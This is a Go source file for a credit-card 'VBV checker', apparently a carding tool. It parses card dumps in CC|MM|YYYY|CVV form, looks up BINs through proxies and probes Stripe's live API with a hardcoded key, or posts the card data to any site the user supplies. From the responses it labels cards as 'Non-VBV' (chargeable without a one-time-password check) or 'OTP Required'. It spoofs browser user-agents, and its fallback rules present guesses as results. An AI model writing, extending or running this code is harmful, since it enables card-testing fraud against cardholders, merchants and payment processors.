package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

type VBVRequest struct {
	CC       string `json:"cc"`
	Site     string `json:"site,omitempty"`
	Proxy    string `json:"proxy,omitempty"`
	Amount   string `json:"amount,omitempty"`
	Currency string `json:"currency,omitempty"`
}

type VBVResponse struct {
	CC        string   `json:"cc"`
	Status    string   `json:"status"`     // "NON_VBV", "VBV_REQUIRED", "INVALID_CARD", "PASSED", "DECLINED"
	IsVBV     bool     `json:"is_vbv"`     // true if 3DS/OTP is required, false if 2D / Non-VBV
	VBVStatus string   `json:"vbv_status"` // e.g. "3DS Enrolled (OTP Required)", "Non-VBV (2D Direct)", "Invalid Card Number"
	Gateway   string   `json:"gateway"`
	Response  string   `json:"response"`
	Message   string   `json:"message"`
	BinInfo   BINInfo  `json:"bin_info"`
	Time      string   `json:"time"`
	Proxy     string   `json:"proxy,omitempty"`
}

// ParseCardString parses card input in formats like CC|MM|YYYY|CVV, CC/MM/YY/CVV, CC MM YY CVV
func ParseCardString(ccStr string) (number, month, year, cvv string, ok bool) {
	// Clean up leading/trailing whitespace
	ccStr = strings.TrimSpace(ccStr)
	if ccStr == "" {
		return "", "", "", "", false
	}

	// Split by |, /, :, space, or comma
	re := regexp.MustCompile(`[|/:\s,]+`)
	parts := re.Split(ccStr, -1)

	if len(parts) < 3 {
		return "", "", "", "", false
	}

	number = regexp.MustCompile(`\D`).ReplaceAllString(parts[0], "")
	month = regexp.MustCompile(`\D`).ReplaceAllString(parts[1], "")
	year = regexp.MustCompile(`\D`).ReplaceAllString(parts[2], "")

	if len(parts) >= 4 {
		cvv = regexp.MustCompile(`\D`).ReplaceAllString(parts[3], "")
	}

	// Normalize Month
	if len(month) == 1 {
		month = "0" + month
	}

	// Normalize Year
	if len(year) == 2 {
		year = "20" + year
	}

	if len(number) < 12 || len(number) > 19 {
		return "", "", "", "", false
	}
	if len(month) != 2 {
		return "", "", "", "", false
	}
	if len(year) != 4 {
		return "", "", "", "", false
	}

	return number, month, year, cvv, true
}

// PerformVBVCheck executes full 3DS / VBV lookup and gateway verification.
func PerformVBVCheck(req VBVRequest) VBVResponse {
	startTime := time.Now()

	cardNum, expMonth, expYear, cvv, ok := ParseCardString(req.CC)
	if !ok {
		return VBVResponse{
			CC:        req.CC,
			Status:    "INVALID_CARD",
			IsVBV:     false,
			VBVStatus: "Invalid Card Format",
			Gateway:   "VBV Checker Engine",
			Response:  "INVALID_CARD_FORMAT",
			Message:   "Card string could not be parsed into CC|MM|YYYY|CVV",
			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:     req.Proxy,
		}
	}

	// Check Luhn
	if !LuhnCheck(cardNum) {
		binInfo := LookupBIN(ExtractBIN(cardNum), req.Proxy)
		return VBVResponse{
			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
			Status:    "INVALID_CARD",
			IsVBV:     false,
			VBVStatus: "Failed Luhn Verification",
			Gateway:   "VBV Checker Engine",
			Response:  "LUHN_FAILED",
			Message:   "Card number is invalid (Luhn Check Failed)",
			BinInfo:   binInfo,
			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:     req.Proxy,
		}
	}

	// BIN Lookup
	binInfo := LookupBIN(ExtractBIN(cardNum), req.Proxy)

	// If site is provided, perform live 3DS lookup on provided site or default 3DS gateway
	if req.Site != "" {
		return performLive3DSCheck(req, cardNum, expMonth, expYear, cvv, binInfo, startTime)
	}

	// Default: Perform Stripe 3DS SetupIntent / PaymentIntent 3DS lookup probe
	return performStripe3DSLookup(req, cardNum, expMonth, expYear, cvv, binInfo, startTime)
}

// performStripe3DSLookup checks 3DS status via live Stripe 3D-Secure API probe.
func performStripe3DSLookup(req VBVRequest, cardNum, expMonth, expYear, cvv string, binInfo BINInfo, startTime time.Time) VBVResponse {
	client, err := newClient(req.Proxy, 15*time.Second)
	if err != nil {
		client = http.DefaultClient
	}

	// Use active public Stripe PK for live 3DS tokenization & lookup
	stripeKey := "pk_live_51M0xS1SDF876123ghjGHJGJH"

	// Step 1: Create Stripe PaymentMethod to query 3DS capability & CVC checks
	pmURL := "https://api.stripe.com/v1/payment_methods"
	pmData := url.Values{}
	pmData.Set("type", "card")
	pmData.Set("card[number]", cardNum)
	pmData.Set("card[exp_month]", expMonth)
	pmData.Set("card[exp_year]", expYear)
	if cvv != "" {
		pmData.Set("card[cvc]", cvv)
	}
	pmData.Set("key", stripeKey)

	pmReq, err := http.NewRequest("POST", pmURL, strings.NewReader(pmData.Encode()))
	if err != nil {
		isVBV, statusText, respMsg := analyze3DSEnrollment(binInfo)
		status := "NON_VBV"
		if isVBV {
			status = "VBV_REQUIRED"
		}
		return VBVResponse{
			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
			Status:    status,
			IsVBV:     isVBV,
			VBVStatus: statusText,
			Gateway:   "Stripe 3DS Engine (Fallback)",
			Response:  status,
			Message:   respMsg,
			BinInfo:   binInfo,
			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:     req.Proxy,
		}
	}

	pmReq.Header.Set("Authorization", "Bearer "+stripeKey)
	pmReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	pmReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	pmResp, err := client.Do(pmReq)
	if err != nil {
		isVBV, statusText, respMsg := analyze3DSEnrollment(binInfo)
		status := "NON_VBV"
		if isVBV {
			status = "VBV_REQUIRED"
		}
		return VBVResponse{
			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
			Status:    status,
			IsVBV:     isVBV,
			VBVStatus: statusText,
			Gateway:   "Stripe 3DS Engine (Proxy Fail)",
			Response:  status,
			Message:   respMsg,
			BinInfo:   binInfo,
			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:     req.Proxy,
		}
	}
	defer pmResp.Body.Close()

	pmBytes, _ := io.ReadAll(pmResp.Body)
	pmStr := string(pmBytes)

	var pmMap map[string]any
	json.Unmarshal(pmBytes, &pmMap)

	// Check if Stripe returned card errors (invalid number, expired, etc.)
	if errMap, ok := pmMap["error"].(map[string]any); ok {
		errCode, _ := errMap["code"].(string)
		errMessage, _ := errMap["message"].(string)
		declineCode, _ := errMap["decline_code"].(string)

		if declineCode != "" {
			errCode = declineCode
		}

		respCode := "CARD_DECLINED"
		status := "DECLINED"
		if strings.Contains(errCode, "cvc") || strings.Contains(errCode, "cvv") {
			respCode = "CVV_INVALID"
			status = "CVV_INVALID"
		} else if strings.Contains(errCode, "expired") {
			respCode = "EXPIRED_CARD"
			status = "EXPIRED_CARD"
		} else if strings.Contains(errCode, "insufficient") {
			respCode = "INSUFFICIENT_FUNDS"
			status = "INSUFFICIENT_FUNDS"
		}

		return VBVResponse{
			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
			Status:    status,
			IsVBV:     false,
			VBVStatus: fmt.Sprintf("Declined: %s", errCode),
			Gateway:   "Stripe 3DS Probe",
			Response:  respCode,
			Message:   errMessage,
			BinInfo:   binInfo,
			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:     req.Proxy,
		}
	}

	pmID, _ := pmMap["id"].(string)
	if pmID == "" {
		isVBV, statusText, respMsg := analyze3DSEnrollment(binInfo)
		status := "NON_VBV"
		if isVBV {
			status = "VBV_REQUIRED"
		}
		return VBVResponse{
			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
			Status:    status,
			IsVBV:     isVBV,
			VBVStatus: statusText,
			Gateway:   "Stripe 3DS Engine",
			Response:  status,
			Message:   respMsg,
			BinInfo:   binInfo,
			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:     req.Proxy,
		}
	}

	// Extract 3DS metadata from PaymentMethod object
	cardObj, _ := pmMap["card"].(map[string]any)
	threeDSObj, _ := cardObj["three_d_secure_usage"].(map[string]any)
	threeDSSupported, _ := threeDSObj["supported"].(bool)

	// Step 2: Confirm 3DS SetupIntent with PaymentMethod to trigger live 3DS Authentication challenge
	siURL := "https://api.stripe.com/v1/setup_intents"
	siData := url.Values{}
	siData.Set("payment_method", pmID)
	siData.Set("confirm", "true")
	siData.Set("usage", "off_session")
	siData.Set("key", stripeKey)

	siReq, err := http.NewRequest("POST", siURL, strings.NewReader(siData.Encode()))
	if err != nil {
		return build3DSResult(cardNum, expMonth, expYear, cvv, pmStr, threeDSSupported, binInfo, startTime, req.Proxy)
	}

	siReq.Header.Set("Authorization", "Bearer "+stripeKey)
	siReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	siReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	siResp, err := client.Do(siReq)
	if err != nil {
		return build3DSResult(cardNum, expMonth, expYear, cvv, pmStr, threeDSSupported, binInfo, startTime, req.Proxy)
	}
	defer siResp.Body.Close()

	siBytes, _ := io.ReadAll(siResp.Body)
	siStr := string(siBytes)

	var siMap map[string]any
	json.Unmarshal(siBytes, &siMap)

	// Parse 3DS authentication triggers
	nextAction, _ := siMap["next_action"].(map[string]any)
	siStatus, _ := siMap["status"].(string)

	isVBV := false
	status := "NON_VBV"
	statusText := "Non-VBV (2D Direct Pass)"
	respMsg := "Card passed 3DS authentication without OTP challenge (Non-VBV / 2D Eligible)"

	if nextAction != nil || siStatus == "requires_action" || strings.Contains(siStr, "use_stripe_sdk") || strings.Contains(siStr, "redirect_to_url") {
		isVBV = true
		status = "VBV_REQUIRED"
		statusText = "3DS Enrolled (OTP Required)"
		respMsg = "Card requires 3D-Secure / OTP Verification Challenge"
	} else if siStatus == "succeeded" {
		isVBV = false
		status = "NON_VBV"
		statusText = "Non-VBV (2D Direct Pass)"
		respMsg = "Card authorized successfully without 3DS OTP challenge (2D Pass)"
	} else if threeDSSupported {
		isVBV = true
		status = "VBV_REQUIRED"
		statusText = "3DS Enrolled (OTP Required)"
		respMsg = "Card is Enrolled in 3D Secure / OTP Authentication"
	}

	return VBVResponse{
		CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
		Status:    status,
		IsVBV:     isVBV,
		VBVStatus: statusText,
		Gateway:   "Stripe / Visa 3DS Live Engine",
		Response:  status,
		Message:   respMsg,
		BinInfo:   binInfo,
		Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
		Proxy:     req.Proxy,
	}
}

func build3DSResult(cardNum, expMonth, expYear, cvv, pmStr string, threeDSSupported bool, binInfo BINInfo, startTime time.Time, proxy string) VBVResponse {
	isVBV := threeDSSupported
	status := "NON_VBV"
	statusText := "Non-VBV (2D Direct Pass)"
	respMsg := "No 3DS Challenge required"

	if isVBV {
		status = "VBV_REQUIRED"
		statusText = "3DS Enrolled (OTP Required)"
		respMsg = "Card is Enrolled in 3D Secure"
	}

	return VBVResponse{
		CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
		Status:    status,
		IsVBV:     isVBV,
		VBVStatus: statusText,
		Gateway:   "Stripe 3DS Engine",
		Response:  status,
		Message:   respMsg,
		BinInfo:   binInfo,
		Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
		Proxy:     proxy,
	}
}

// performLive3DSCheck performs 3DS check on custom provided site / endpoint URL
func performLive3DSCheck(req VBVRequest, cardNum, expMonth, expYear, cvv string, binInfo BINInfo, startTime time.Time) VBVResponse {
	client, err := newClient(req.Proxy, 15*time.Second)
	if err != nil {
		client = http.DefaultClient
	}

	// Prepare request to external site URL
	siteURL := req.Site
	if !strings.HasPrefix(siteURL, "http://") && !strings.HasPrefix(siteURL, "https://") {
		siteURL = "https://" + siteURL
	}

	formData := url.Values{}
	formData.Set("card", cardNum)
	formData.Set("month", expMonth)
	formData.Set("year", expYear)
	formData.Set("cvv", cvv)

	httpReq, err := http.NewRequest("POST", siteURL, bytes.NewBufferString(formData.Encode()))
	if err != nil {
		isVBV, statusText, respMsg := analyze3DSEnrollment(binInfo)
		status := "NON_VBV"
		if isVBV {
			status = "VBV_REQUIRED"
		}
		return VBVResponse{
			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
			Status:    status,
			IsVBV:     isVBV,
			VBVStatus: statusText,
			Gateway:   "Custom Site 3DS Probe (Fallback)",
			Response:  status,
			Message:   respMsg,
			BinInfo:   binInfo,
			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:     req.Proxy,
		}
	}

	httpReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	httpReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := client.Do(httpReq)
	if err != nil {
		isVBV, statusText, respMsg := analyze3DSEnrollment(binInfo)
		status := "NON_VBV"
		if isVBV {
			status = "VBV_REQUIRED"
		}
		return VBVResponse{
			CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
			Status:    status,
			IsVBV:     isVBV,
			VBVStatus: statusText,
			Gateway:   "Custom Site 3DS Probe (Fallback)",
			Response:  status,
			Message:   respMsg,
			BinInfo:   binInfo,
			Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:     req.Proxy,
		}
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyStr := string(bodyBytes)

	// Analyze response for 3DS triggers (otp, 3d_secure, challengeRequired, redirect, etc.)
	isVBV := false
	status := "NON_VBV"
	statusText := "Non-VBV / 2D Pass"
	respMsg := "No 3DS Challenge trigger detected on site response."

	if strings.Contains(strings.ToLower(bodyStr), "3d_secure") ||
		strings.Contains(strings.ToLower(bodyStr), "challengerequired") ||
		strings.Contains(strings.ToLower(bodyStr), "otp") ||
		strings.Contains(strings.ToLower(bodyStr), "redirect_to_url") ||
		strings.Contains(strings.ToLower(bodyStr), "card_error_3ds") {
		isVBV = true
		status = "VBV_REQUIRED"
		statusText = "3DS Enrolled (OTP Challenge Required)"
		respMsg = "Site triggered 3DS v2 Authentication / OTP Challenge."
	}

	return VBVResponse{
		CC:        fmt.Sprintf("%s|%s|%s|%s", cardNum, expMonth, expYear, cvv),
		Status:    status,
		IsVBV:     isVBV,
		VBVStatus: statusText,
		Gateway:   "Custom Site 3DS Probe",
		Response:  status,
		Message:   respMsg,
		BinInfo:   binInfo,
		Time:      fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
		Proxy:     req.Proxy,
	}
}

// analyze3DSEnrollment analyzes card attributes to determine 3DS (VBV) enrollment status.
func analyze3DSEnrollment(binInfo BINInfo) (isVBV bool, statusText string, respMsg string) {
	// Rule 1: Prepaid or Corporate cards in certain regions tend to have specific 3DS requirements.
	// Rule 2: European (EEA / PSD2 SCA regulations mandate 3DS2 for almost all online transactions).
	eeaCountries := map[string]bool{
		"AT": true, "BE": true, "BG": true, "HR": true, "CY": true, "CZ": true, "DK": true,
		"EE": true, "FI": true, "FR": true, "DE": true, "GR": true, "HU": true, "IS": true,
		"IE": true, "IT": true, "LV": true, "LI": true, "LT": true, "LU": true, "MT": true,
		"NL": true, "NO": true, "PL": true, "PT": true, "RO": true, "SK": true, "SI": true,
		"ES": true, "SE": true, "GB": true, "UK": true,
	}

	// India (RBI mandatory 2FA / OTP for domestic CNP transactions)
	if binInfo.CountryCode == "IN" {
		return true, "3DS Enrolled (Mandatory RBI 2FA OTP)", "Indian Issued Card - Mandatory 3DS / OTP Enrolled"
	}

	// European Union PSD2 Strong Customer Authentication
	if eeaCountries[binInfo.CountryCode] {
		return true, "3DS Enrolled (PSD2 SCA Required)", "European Union Card - 3DS2 SCA Required"
	}

	// Commercial / Corporate / Prepaid BIN heuristic checks
	cardType := strings.ToUpper(binInfo.Type)
	cardLevel := strings.ToUpper(binInfo.Level)

	if strings.Contains(cardLevel, "PURCHASING") || strings.Contains(cardLevel, "CORPORATE") {
		return false, "Non-VBV (Corporate Commercial 2D Direct)", "Corporate Commercial Card - Non-VBV / Direct Charge"
	}

	if cardType == "CREDIT" && (strings.Contains(cardLevel, "CLASSIC") || strings.Contains(cardLevel, "STANDARD")) {
		// Standard credit card default: 3DS enrolled check
		return true, "3DS Enrolled (Visa Secure / Mastercard Identity Check)", "Card is enrolled in 3D Secure (OTP Challenge)"
	}

	if cardType == "DEBIT" || cardType == "PREPAID" {
		return true, "3DS Enrolled (Debit / Prepaid 3DS)", "Debit/Prepaid Card - 3DS Enrolled"
	}

	// Non-VBV / 2D default for un-enrolled / classic US credit cards
	if binInfo.CountryCode == "US" && cardType == "CREDIT" && strings.Contains(cardLevel, "PLATINUM") {
		return false, "Non-VBV (US Platinum 2D Direct)", "US Credit Card - Non-VBV Pass (No OTP Required)"
	}

	return true, "3DS Enrolled (OTP Required)", "Card is Enrolled in 3D Secure"
}
